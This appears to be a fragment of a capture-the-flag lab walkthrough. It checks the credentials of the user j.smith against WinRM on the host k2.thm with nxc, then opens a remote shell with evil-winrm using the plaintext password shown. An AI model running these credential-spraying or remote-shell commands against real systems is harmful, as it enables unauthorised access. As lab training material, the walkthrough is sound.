
#Attaking_Machine 
Run the following command to check whether this user has access via `winrm`.

```
nxc winrm k2.thm -u j.smith -p 'Password123@' 
```

![[winrm 1.png]]

J.Smith can access via WinRM to the machine.

#Attaking_Machine 
Connect via WinRM.

```
evil-winrm -i k2.thm -u j.smith -p 'Password123@'
```

![[winrm_j.smith.png]]

**Next step:** [[First question]]

